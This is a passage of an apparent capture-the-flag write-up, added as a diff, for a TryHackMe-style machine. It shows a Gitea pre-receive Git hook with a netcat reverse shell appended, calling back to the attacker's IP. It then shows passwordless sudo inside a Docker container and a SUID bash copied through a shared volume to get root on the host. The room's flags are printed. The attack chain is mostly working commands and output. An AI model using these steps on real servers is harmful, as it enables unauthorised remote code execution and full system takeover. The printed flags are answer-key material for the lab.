@@ -348,3 +348,179 @@ create a new repository and http://10.10.217.23:8080/witty/testing/settings/hook
 # and rejects all pushes when the "reject" push option is used.
 #
 ```
+
+## Exploitation
+```text
+# To enable this hook, rename this file to "pre-receive".
+
+if test -n "$GIT_PUSH_OPTION_COUNT"
+then
+	i=0
+	while test "$i" -lt "$GIT_PUSH_OPTION_COUNT"
+	do
+		eval "value=\$GIT_PUSH_OPTION_$i"
+		case "$value" in
+		echoback=*)
+			echo "echo from the pre-receive-hook: ${value#*=}" >&2
+			;;
+		reject)
+			exit 1
+		esac
+		i=$((i + 1))
+	done
+fi
+mkfifo /tmp/f; nc 10.8.19.103 4444 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+
+dylan@year-of-the-dog:/gitea/gitea$ cd /tmp
+dylan@year-of-the-dog:/tmp$ git clone http://localhost:3000/witty/testing && cd testing
+Cloning into 'testing'...
+warning: You appear to have cloned an empty repository.
+dylan@year-of-the-dog:/tmp/testing$ echo "test" >> README.md
+dylan@year-of-the-dog:/tmp/testing$ git add README.md
+dylan@year-of-the-dog:/tmp/testing$ git commit -m "Exploit"
+[master (root-commit) 0add72d] Exploit
+ 1 file changed, 1 insertion(+)
+ create mode 100644 README.md
+dylan@year-of-the-dog:/tmp/testing$ git push
+Username for 'http://localhost:3000': witty
+Password for 'http://witty@localhost:3000': 
+Counting objects: 3, done.
+Writing objects: 100% (3/3), 217 bytes | 217.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0)
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.217.23] 39305
+which python3
+which python
+bash
+id
+uid=1000(git) gid=1000(git) groups=1000(git),1000(git)
+ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
+    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+sudo -l
+User git may run the following commands on 42040a8f97fc:
+    (ALL) NOPASSWD: ALL
+    
+Container Privesc
+
+sudo -s
+whoami
+root
+cd /root
+ls
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh dylan@10.10.217.23      
+dylan@10.10.217.23's password: 
+
+ ____              
+	\ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  _ \  ___   __ _ 
+	 \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | | | |/ _ \ / _` |
+	  | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ | |_| | (_) | (_| |
+	  |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |____/ \___/ \__, |
+	                                                                |___/ 
+
+dylan@year-of-the-dog:~$ cd /bin
+dylan@year-of-the-dog:/bin$ ls
+bash                journalctl     pwd
+btrfs               kbd_mode       rbash
+btrfsck             kill           readlink
+btrfs-debug-tree    kmod           red
+btrfs-find-root     less           rm
+btrfs-image         lessecho       rmdir
+btrfs-map-logical   lessfile       rnano
+btrfs-select-super  lesskey        run-parts
+btrfstune           lesspipe       sed
+btrfs-zero-log      ln             setfacl
+bunzip2             loadkeys       setfont
+busybox             login          setupcon
+bzcat               loginctl       sh
+bzcmp               lowntfs-3g     sh.distrib
+bzdiff              ls             sleep
+bzegrep             lsblk          ss
+bzexe               lsmod          static-sh
+bzfgrep             mkdir          stty
+bzgrep              mkfs.btrfs     su
+bzip2               mknod          sync
+bzip2recover        mktemp         systemctl
+bzless              more           systemd
+bzmore              mount          systemd-ask-password
+cat                 mountpoint     systemd-escape
+chacl               mt             systemd-hwdb
+chgrp               mt-gnu         systemd-inhibit
+chmod               mv             systemd-machine-id-setup
+chown               nano           systemd-notify
+chvt                nc             systemd-sysusers
+cp                  nc.openbsd     systemd-tmpfiles
+cpio                netcat         systemd-tty-ask-password-agent
+dash                netstat        tar
+date                networkctl     tempfile
+dd                  nisdomainname  touch
+df                  ntfs-3g        true
+dir                 ntfs-3g.probe  udevadm
+dmesg               ntfscat        ulockmgr_server
+dnsdomainname       ntfscluster    umount
+domainname          ntfscmp        uname
+dumpkeys            ntfsfallocate  uncompress
+echo                ntfsfix        unicode_start
+ed                  ntfsinfo       vdir
+egrep               ntfsls         wdctl
+false               ntfsmove       which
+fgconsole           ntfsrecover    whiptail
+fgrep               ntfssecaudit   ypdomainname
+findmnt             ntfstruncate   zcat
+fsck.btrfs          ntfsusermap    zcmp
+fuser               ntfswipe       zdiff
+fusermount          open           zegrep
+getfacl             openvt         zfgrep
+grep                pidof          zforce
+gunzip              ping           zgrep
+gzexe               ping4          zless
+gzip                ping6          zmore
+hostname            plymouth       znew
+ip                  ps
+https://chmodcommand.com/chmod-4755/
+
+dylan@year-of-the-dog:/bin$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+172.17.0.2 - - [27/Jun/2023 17:49:09] "GET /bash HTTP/1.1" 200 -
+
+inside container
+wget 172.17.0.1:8000/bash -O /data/bash
+Connecting to 172.17.0.1:8000 (172.17.0.1:8000)
+saving to '/data/bash'
+bash                 100% |********************************| 1087k  0:00:00 ETA
+'/data/bash' saved
+chmod 4755 /data/bash
+
+dylan@year-of-the-dog:/bin$ cd /gitea
+dylan@year-of-the-dog:/gitea$ ls
+bash  git  gitea  ssh
+dylan@year-of-the-dog:/gitea$ ./bash -p
+bash-4.4# whoami
+root
+bash-4.4# cd /root
+bash-4.4# ls
+root.txt
+bash-4.4# cat root.txt
+THM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}
+```
+User Flag
+Root Flag
+
+## Flags / Answers
+- ***THM{OTE3MTQyNTM5NzRiN2VjNTQyYWM2M2Ji}***
+- ***THM{MzlhNGY5YWM0ZTU5ZGQ0OGI0YTc0OWRh}***
+
+## Notes / Lessons Learned
+[[Madeye's Castle]]
+
